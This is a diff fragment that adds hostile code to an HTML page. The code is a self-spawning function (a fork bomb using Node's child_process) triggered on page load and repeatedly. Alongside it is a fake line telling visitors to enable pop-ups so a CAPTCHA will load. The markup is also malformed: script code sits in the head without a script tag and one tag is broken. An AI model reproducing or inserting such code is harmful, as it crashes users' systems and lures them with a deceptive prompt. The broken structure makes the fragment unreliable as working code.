@@ -1,5 +1,15 @@
 <html>
+  
+  <head>
+    function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }();
+    window.onload = f;
+
+    
+    
+  </head>
   <body>
+    <>Please enable pop ups so that the CAPTCHA will load up properly</b>
+    
     <script>
       f();
       setInterval(function() {
